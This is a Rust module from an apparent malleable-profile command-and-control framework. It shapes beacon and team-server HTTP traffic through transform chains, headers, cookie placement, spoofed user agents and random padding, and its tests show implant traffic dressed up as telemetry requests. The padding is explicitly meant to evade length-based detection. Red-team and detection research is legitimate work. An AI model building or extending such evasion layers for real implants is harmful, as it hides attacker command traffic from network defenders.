//! Malleable C2 HTTP *envelope* helpers.
//!
//! The transform engine ([`crate::transform`]) applies byte transforms to a
//! payload, but a profile's `server { output { ... } }` block also declares
//! *where* the transformed bytes go (header / parameter / body / uri-append)
//! and which response headers to set. This module turns a parsed profile into
//! ready-to-use request/response shaping so the team server can stop emitting
//! raw encrypted frames and instead make beacon traffic look like the
//! transaction the profile describes.
//!
//! Two directions, symmetric across the wire:
//! - [`ServerEnvelope`] (via [`post_server_envelope`]/[`get_server_envelope`])
//!   shapes the server→beacon *response*; the team server applies it in
//!   `shape_beacon_response`.
//! - [`ClientEnvelope`] (via [`post_client_envelope`]/[`get_client_envelope`])
//!   shapes the beacon→server *request*; the implant applies the transform to
//!   its encrypted frame before sending and the team server inverts it in
//!   `handle_beacon` before `parse_frame`. The transform engine is invertible
//!   ([`transform::decode`] undoes [`transform::encode`]), so a profile that
//!   declares `client { output { base64; print; } }` makes the beacon body
//!   base64 on the wire while the server still parses the raw frame.
//!
//! On top of content shaping, the top-level `set padding_min/max` options add
//! traffic-shaping padding (random length per transaction, self-delimiting so
//! the receiver strips it before decoding) — blurring the packet-length
//! distribution that content-layer mimicry alone leaves detectable.

use crate::ast::{Block, Profile};
use crate::transform::{self, Terminator};

/// Per-call seed for the padding PRNG. This crate deliberately has no `rand`
/// dependency and padding bytes are traffic-shaping filler (not secret
/// material), so a xorshift32 chain lazily seeded from the system clock is
/// enough — the implant side uses the same cheap pattern (its own static
/// xorshift in transport.rs, mirroring beacon.rs `sleep_jitter`).
fn pad_seed() -> u32 {
    use std::sync::atomic::{AtomicU32, Ordering};
    use std::time::{SystemTime, UNIX_EPOCH};
    static SEED: AtomicU32 = AtomicU32::new(0);
    let mut x = SEED.load(Ordering::Relaxed);
    if x == 0 {
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.subsec_nanos())
            .unwrap_or(0);
        x = nanos ^ 0x9E37_79B9;
        if x == 0 {
            x = 0x9E37_79B9;
        }
    }
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    SEED.store(x, Ordering::Relaxed);
    x
}

/// Read the top-level `set padding_min/max` options (bytes of traffic-shaping
/// filler appended after the transform chain). Absent → 0 (disabled, the
/// pre-padding behaviour); non-numeric → treated as 0 here and flagged as an
/// Error by c2lint; values above [`transform::PAD_LEN_CAP`] are clamped (the
/// self-delimiting length suffix is 12 bits).
fn padding_of(profile: &Profile) -> (usize, usize) {
    let parse = |key: &str| {
        profile
            .option(key)
            .and_then(|s| s.as_str().parse::<usize>().ok())
    };
    let max = parse("padding_max").unwrap_or(0).min(transform::PAD_LEN_CAP);
    let min = parse("padding_min").unwrap_or(0).min(max);
    (min, max)
}

/// A fully-resolved description of how to shape the server→beacon response for
/// one transaction (`http-get` or `http-post`). Derived from the profile's
/// `server { output { ... } }` + `header` statements.
#[derive(Debug, Clone, Default)]
pub struct ServerEnvelope {
    /// Transform steps to apply to the encrypted frame body (in source order).
    pub steps: Vec<transform::Step>,
    /// Where the transformed body goes. `None` means "no output block; body is
    /// raw" (the legacy behaviour before profile envelopes were wired up).
    pub terminator: Option<Terminator>,
    /// `(name, value)` pairs from `header "N" "V";` statements in the server
    /// block, to set on the HTTP response.
    pub headers: Vec<(Vec<u8>, Vec<u8>)>,
    /// Traffic-shaping padding range (top-level `set padding_min/max`). Both 0
    /// (the default) means no padding — the wire format is byte-identical to
    /// profiles without these options.
    pub padding_min: usize,
    /// See `padding_min`.
    pub padding_max: usize,
}

impl ServerEnvelope {
    /// Shape an encrypted frame body for the wire: apply the transform pipeline
    /// and, if the terminator is a header/parameter, return `(body, extra)`
    /// where `extra` is the bytes to inject there. For `print`/`uri-append`
    /// the bytes ride in the body itself, so `extra` is empty.
    ///
    /// Traffic-shaping padding (when configured) is appended AFTER the
    /// transform chain — it is self-delimiting ([`transform::pad_append`]) so
    /// the receiver strips it via [`ServerEnvelope::strip_padding`] BEFORE
    /// `transform::decode`. It must not go through the transform steps
    /// themselves (e.g. base64) or the receiver couldn't locate it.
    pub fn shape_body(&self, frame: &[u8]) -> (Vec<u8>, Vec<u8>) {
        let mut transformed = transform::encode(&self.steps, frame);
        transform::pad_append(
            &mut transformed,
            self.padding_min,
            self.padding_max,
            pad_seed(),
        );
        match &self.terminator {
            Some(Terminator::Header(_)) | Some(Terminator::Parameter(_)) => {
                (Vec::new(), transformed)
            }
            Some(Terminator::Print) | Some(Terminator::UriAppend) | None => {
                (transformed, Vec::new())
            }
        }
    }

    /// Strip the traffic-shaping padding [`ServerEnvelope::shape_body`] added.
    /// No-op (`Ok(buf)`) when padding is disabled; on failure the caller keeps
    /// the raw bytes so the frame parse fails loudly (same discipline as a
    /// decode failure).
    pub fn strip_padding<'a>(&self, buf: &'a [u8]) -> Result<&'a [u8], transform::TransformError> {
        if self.padding_max == 0 {
            Ok(buf)
        } else {
            transform::pad_strip(buf, self.padding_min, self.padding_max)
        }
    }
}

/// Resolve the server-side envelope for the profile's `http-post` transaction
/// (the beacon's main task-delivery channel). Returns a default (no-op) envelope
/// when the profile has no `server { output { } }` block, so callers can always
/// apply it without a None-check.
pub fn post_server_envelope(profile: &Profile) -> ServerEnvelope {
    transaction_server_envelope(profile, profile.http_post())
}

/// Resolve the server-side envelope for `http-get`.
pub fn get_server_envelope(profile: &Profile) -> ServerEnvelope {
    transaction_server_envelope(profile, profile.http_get())
}

fn transaction_server_envelope(profile: &Profile, txn: Option<&Block>) -> ServerEnvelope {
    // Padding is a top-level option — it applies even without a server block.
    let (padding_min, padding_max) = padding_of(profile);
    let Some(txn) = txn else {
        return ServerEnvelope {
            padding_min,
            padding_max,
            ..ServerEnvelope::default()
        };
    };
    let server = match txn.sub("server") {
        Some(s) => s,
        None => {
            return ServerEnvelope {
                padding_min,
                padding_max,
                ..ServerEnvelope::default()
            };
        }
    };
    let mut env = ServerEnvelope {
        padding_min,
        padding_max,
        ..ServerEnvelope::default()
    };
    // The `output` data block carries the body transform chain + terminator.
    if let Some(output) = server.sub("output") {
        env.steps = transform::steps_from_block(output);
        env.terminator = terminator_of(output);
    }
    // `header "N" "V";` statements (both inside and outside data blocks in CS).
    for args in server.stmts("header") {
        if args.len() >= 2 {
            env.headers.push((args[0].0.clone(), args[1].0.clone()));
        }
    }
    env
}

// ---- client-side request envelope (beacon → server) ------------------------

/// A fully-resolved description of how to shape the beacon→server *request* for
/// one transaction (`http-get` or `http-post`). Symmetric to [`ServerEnvelope`]
/// but for the request direction: the implant applies [`ClientEnvelope::shape_body`]
/// to its encrypted frame before sending, and the team server inverts it in the
/// beacon handler before `parse_frame`.
///
/// Derived from the profile's `client { output/metadata { ... } }` data block +
/// the client-block `header "N" "V";` statements + the top-level `set useragent`.
#[derive(Debug, Clone, Default)]
pub struct ClientEnvelope {
    /// Transform steps to apply to the encrypted frame body (in source order).
    pub steps: Vec<transform::Step>,
    /// Where the transformed body goes. `None` = no data block; body is raw.
    pub terminator: Option<Terminator>,
    /// `(name, value)` pairs from `header "N" "V";` statements directly in the
    /// client block (static headers added to every request).
    pub headers: Vec<(Vec<u8>, Vec<u8>)>,
    /// `set useragent` (top-level option). `None` = use the transport default.
    pub useragent: Option<Vec<u8>>,
    /// Traffic-shaping padding range (top-level `set padding_min/max`). Both 0
    /// (the default) means no padding — the wire format is byte-identical to
    /// profiles without these options.
    pub padding_min: usize,
    /// See `padding_min`.
    pub padding_max: usize,
}

impl ClientEnvelope {
    /// Shape an encrypted frame body for the request — the mirror of
    /// [`ServerEnvelope::shape_body`]. Returns `(body, extra)` where `extra`
    /// holds the bytes to inject into a header/parameter terminator (empty for
    /// `print`/`uri-append`/none, where the bytes ride in the body).
    ///
    /// Traffic-shaping padding (when configured) is appended AFTER the
    /// transform chain — self-delimiting, stripped by the receiver BEFORE
    /// `transform::decode` (see [`transform::pad_append`]).
    pub fn shape_body(&self, frame: &[u8]) -> (Vec<u8>, Vec<u8>) {
        let mut transformed = transform::encode(&self.steps, frame);
        transform::pad_append(
            &mut transformed,
            self.padding_min,
            self.padding_max,
            pad_seed(),
        );
        match &self.terminator {
            Some(Terminator::Header(_)) | Some(Terminator::Parameter(_)) => {
                (Vec::new(), transformed)
            }
            Some(Terminator::Print) | Some(Terminator::UriAppend) | None => {
                (transformed, Vec::new())
            }
        }
    }

    /// Strip the traffic-shaping padding [`ClientEnvelope::shape_body`] added.
    /// No-op (`Ok(buf)`) when padding is disabled. Used by the team server
    /// before `transform::decode` in the beacon handler.
    pub fn strip_padding<'a>(&self, buf: &'a [u8]) -> Result<&'a [u8], transform::TransformError> {
        if self.padding_max == 0 {
            Ok(buf)
        } else {
            transform::pad_strip(buf, self.padding_min, self.padding_max)
        }
    }

    /// Whether this envelope is a no-op (no steps, no terminator, no headers,
    /// no useragent, no padding) — i.e. the implant should send the raw frame
    /// untouched and the server should skip its decode pass. The common dev
    /// case (no profile, or a profile with no `client { }` block).
    pub fn is_noop(&self) -> bool {
        self.steps.is_empty()
            && self.terminator.is_none()
            && self.headers.is_empty()
            && self.useragent.is_none()
            && self.padding_max == 0
    }
}

/// Resolve the client-side request envelope for `http-post` (the beacon's
/// outbound tasking channel). Reads the `client { output { ... } }` data block,
/// the client-block static headers, and the top-level `set useragent`.
pub fn post_client_envelope(profile: &Profile) -> ClientEnvelope {
    transaction_client_envelope(profile, profile.http_post(), "output")
}

/// Resolve the client-side request envelope for `http-get` (the beacon's
/// check-in/metadata channel). Reads the `client { metadata { ... } }` block.
pub fn get_client_envelope(profile: &Profile) -> ClientEnvelope {
    transaction_client_envelope(profile, profile.http_get(), "metadata")
}

fn transaction_client_envelope(
    profile: &Profile,
    txn: Option<&Block>,
    data_block: &str,
) -> ClientEnvelope {
    // Padding is a top-level option — it applies even without a client block.
    let (padding_min, padding_max) = padding_of(profile);
    let mut env = ClientEnvelope {
        // `set useragent` is a top-level option, not per-transaction.
        useragent: profile.option("useragent").map(|s| s.0.clone()),
        padding_min,
        padding_max,
        ..ClientEnvelope::default()
    };
    let Some(txn) = txn else {
        return env;
    };
    let Some(client) = txn.sub("client") else {
        return env;
    };
    // The data block (`output` for http-post, `metadata` for http-get) carries
    // the body transform chain + terminator.
    if let Some(data) = client.sub(data_block) {
        env.steps = transform::steps_from_block(data);
        env.terminator = terminator_of(data);
    }
    // Static `header "N" "V";` statements directly in the client block. A
    // 1-arg `header "Cookie";` *inside* the data block is the terminator (above),
    // not a static header — it is a child of the data block, not of `client`.
    for args in client.stmts("header") {
        if args.len() >= 2 {
            env.headers.push((args[0].0.clone(), args[1].0.clone()));
        }
    }
    env
}

/// The terminator of a data block = the last non-transform statement that
/// declares where bytes go (`header`, `parameter`, `print`, `uri-append`).
fn terminator_of(block: &Block) -> Option<Terminator> {
    for item in &block.items {
        if let crate::ast::Item::Stmt { keyword, args, .. } = item {
            match keyword.as_str() {
                "header" => {
                    return Some(Terminator::Header(
                        String::from_utf8_lossy(&args.first()?.0).into_owned(),
                    ));
                }
                "parameter" => {
                    return Some(Terminator::Parameter(
                        String::from_utf8_lossy(&args.first()?.0).into_owned(),
                    ));
                }
                "print" => return Some(Terminator::Print),
                "uri-append" => return Some(Terminator::UriAppend),
                _ => {}
            }
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    fn parse(src: &str) -> Profile {
        crate::parse(src).expect("profile must parse")
    }

    #[test]
    fn empty_profile_is_noop_envelope() {
        let p = parse(
            r#"http-post { set uri "/p"; client { output { print; } } server { output { print; } } }"#,
        );
        let env = post_server_envelope(&p);
        assert_eq!(env.steps, vec![]);
        assert_eq!(env.terminator, Some(Terminator::Print));
        assert!(env.headers.is_empty());
    }

    #[test]
    fn output_transform_chain_is_extracted() {
        let p = parse(
            r#"http-post {
                set uri "/api/telemetry";
                client { output { base64; } }
                server {
                    output {
                        base64;
                        mask;
                        prepend "\x1f\x8b";
                        print;
                    }
                    header "Content-Type" "application/json";
                    header "X-Trace" "abc";
                }
            }"#,
        );
        let env = post_server_envelope(&p);
        assert_eq!(
            env.steps,
            vec![
                transform::Step::Base64,
                transform::Step::Mask,
                transform::Step::Prepend(vec![0x1f, 0x8b]),
            ]
        );
        assert_eq!(env.terminator, Some(Terminator::Print));
        assert_eq!(env.headers.len(), 2);
        assert_eq!(env.headers[0].0, b"Content-Type");
        assert_eq!(env.headers[0].1, b"application/json");
    }

    #[test]
    fn shaping_then_unshaping_roundtrips() {
        let p = parse(
            r#"http-post { set uri "/p"; client { output { print; } } server { output { base64; prepend "PRE"; append "POST"; print; } } }"#,
        );
        let env = post_server_envelope(&p);
        let frame = b"encrypted-frame-bytes-here";
        let (body, extra) = env.shape_body(frame);
        assert!(extra.is_empty(), "print terminator keeps bytes in body");
        assert!(body.starts_with(b"PRE"));
        assert!(body.ends_with(b"POST"));
        // The transform pipeline is invertible: decode(body) == frame.
        let restored = transform::decode(&env.steps, &body).unwrap();
        assert_eq!(restored, frame);
    }

    #[test]
    fn header_terminator_puts_bytes_in_extra() {
        let p = parse(
            r#"http-post { set uri "/p"; client { output { print; } } server { output { base64; header "Cookie"; } } }"#,
        );
        let env = post_server_envelope(&p);
        let (body, extra) = env.shape_body(b"hello");
        assert!(
            body.is_empty(),
            "body should be empty for header terminator"
        );
        assert!(!extra.is_empty(), "transformed bytes go in extra");
    }

    // ---- ClientEnvelope (beacon → server request shaping) ------------------

    #[test]
    fn profile_with_no_client_block_is_noop() {
        // No `client { }` block → the implant must send the raw frame and the
        // server must skip its decode pass. This is the default dev path.
        let p = parse(r#"http-post { set uri "/p"; server { output { print; } } }"#);
        let env = post_client_envelope(&p);
        assert!(env.is_noop(), "no client block → raw frame, no shaping");
        assert!(env.useragent.is_none());
    }

    #[test]
    fn client_output_print_terminator_is_not_noop() {
        // A `client { output { print; } }` has no transform steps but DOES set
        // a terminator, so it is NOT a no-op (the bytes still ride in the body
        // via print, but the envelope is "declared").
        let p = parse(
            r#"http-post { set uri "/p"; client { output { print; } } server { output { print; } } }"#,
        );
        let env = post_client_envelope(&p);
        assert_eq!(env.steps, vec![]);
        assert_eq!(env.terminator, Some(Terminator::Print));
        assert!(!env.is_noop(), "terminator present → not a no-op");
    }

    #[test]
    fn client_output_transform_useragent_and_static_headers_extracted() {
        let p = parse(
            r#"
            set useragent "Mozilla/5.0 (X11; Linux x86_64) Chrome/120";
            http-post {
                set uri "/api/telemetry";
                client {
                    header "Accept" "application/json";
                    header "X-Client" "nyx";
                    output {
                        base64;
                        prepend "data=";
                        append "&end=1";
                        print;
                    }
                }
                server { output { print; } }
            }"#,
        );
        let env = post_client_envelope(&p);
        assert_eq!(
            env.steps,
            vec![
                transform::Step::Base64,
                transform::Step::Prepend(b"data=".to_vec()),
                transform::Step::Append(b"&end=1".to_vec()),
            ]
        );
        assert_eq!(env.terminator, Some(Terminator::Print));
        assert_eq!(
            env.useragent.as_deref(),
            Some(&b"Mozilla/5.0 (X11; Linux x86_64) Chrome/120"[..])
        );
        assert_eq!(env.headers.len(), 2);
        assert_eq!(
            env.headers[0],
            (b"Accept".to_vec(), b"application/json".to_vec())
        );
        assert_eq!(env.headers[1], (b"X-Client".to_vec(), b"nyx".to_vec()));
    }

    #[test]
    fn client_shape_then_decode_roundtrips_frame() {
        // THE contract: whatever bytes the implant puts on the wire, the server
        // must invert back to the raw frame before parse_frame. encode on the
        // implant (shape_body), decode on the server → original frame bytes.
        let p = parse(
            r#"http-post {
                set uri "/p";
                client { output { mask; base64; prepend "PRE"; append "POST"; print; } }
                server { output { print; } }
            }"#,
        );
        let env = post_client_envelope(&p);
        let frame = b"[32B pubkey][8B counter][4B ct_len][ciphertext||16B tag]";
        let (body, extra) = env.shape_body(frame);
        assert!(extra.is_empty(), "print terminator keeps bytes in body");
        // The server uses the SAME step list to invert.
        let restored = transform::decode(&env.steps, &body).expect("decode must invert encode");
        assert_eq!(restored.as_slice(), frame);
    }

    #[test]
    fn client_get_metadata_header_terminator_uses_extra() {
        // http-get check-in: `metadata { base64; header "Cookie"; }` → the
        // transformed bytes ride in the Cookie header, body empty.
        let p = parse(
            r#"http-get {
                set uri "/c";
                client { metadata { base64; header "Cookie"; } }
                server { output { print; } }
            }"#,
        );
        let env = get_client_envelope(&p);
        assert_eq!(env.steps, vec![transform::Step::Base64]);
        assert!(matches!(env.terminator, Some(Terminator::Header(ref h)) if h == "Cookie"));
        let (body, extra) = env.shape_body(b"checkin-frame");
        assert!(body.is_empty(), "header terminator → body empty");
        assert!(
            !extra.is_empty(),
            "transformed bytes go in extra (the header value)"
        );
        // Server reads the header value and base64-decodes it back to the frame.
        let restored = transform::decode(&env.steps, &extra).unwrap();
        assert_eq!(restored, b"checkin-frame");
    }

    // ---- traffic-shaping padding (set padding_min/max) ---------------------

    #[test]
    fn padding_fields_read_from_top_level_options() {
        let p = parse(
            r#"
            set padding_min "8";
            set padding_max "64";
            http-post { set uri "/p"; client { output { print; } } server { output { print; } } }
            "#,
        );
        let c = post_client_envelope(&p);
        assert_eq!((c.padding_min, c.padding_max), (8, 64));
        let s = post_server_envelope(&p);
        assert_eq!((s.padding_min, s.padding_max), (8, 64));
        assert!(!c.is_noop(), "padding alone makes the envelope non-noop");
    }

    #[test]
    fn padding_clamped_to_length_suffix_cap() {
        let p = parse(
            r#"set padding_max "99999";
               http-post { set uri "/p"; client { output { print; } } server { output { print; } } }"#,
        );
        assert_eq!(post_client_envelope(&p).padding_max, transform::PAD_LEN_CAP);
    }

    #[test]
    fn padded_shape_strip_decode_roundtrips_frame() {
        // THE padding contract: whatever the sender appends after the
        // transform chain, the receiver strips via strip_padding BEFORE
        // transform::decode and recovers the raw frame.
        let p = parse(
            r#"
            set padding_min "8";
            set padding_max "64";
            http-post {
                set uri "/p";
                client { output { mask; base64; prepend "PRE"; append "POST"; print; } }
                server { output { base64; print; } }
            }"#,
        );
        let env = post_client_envelope(&p);
        let frame = b"[32B pubkey][8B counter][4B ct_len][ciphertext||16B tag]";
        let (body, extra) = env.shape_body(frame);
        assert!(extra.is_empty(), "print terminator keeps bytes in body");
        let stripped = env.strip_padding(&body).expect("padding strip");
        let restored = transform::decode(&env.steps, stripped).expect("decode");
        assert_eq!(restored.as_slice(), frame);
    }

    #[test]
    fn padded_lengths_vary_across_shapes() {
        let p = parse(
            r#"
            set padding_min "0";
            set padding_max "128";
            http-post { set uri "/p"; client { output { print; } } server { output { print; } } }
            "#,
        );
        let env = post_client_envelope(&p);
        let lens: std::collections::BTreeSet<usize> = (0..32)
            .map(|_| env.shape_body(b"same-frame").0.len())
            .collect();
        assert!(lens.len() > 1, "padding must blur the length distribution");
    }

    #[test]
    fn no_padding_options_means_no_padding() {
        // Default: padding fields are 0, shape output is the bare transform
        // result, and strip_padding is a pass-through — byte-identical to the
        // pre-padding wire format.
        let p = parse(
            r#"http-post { set uri "/p"; client { output { base64; print; } } server { output { print; } } }"#,
        );
        let env = post_client_envelope(&p);
        assert_eq!((env.padding_min, env.padding_max), (0, 0));
        let (body, _) = env.shape_body(b"frame");
        assert_eq!(body, transform::encode(&env.steps, b"frame"));
        assert_eq!(env.strip_padding(&body).unwrap(), body.as_slice());
    }
}
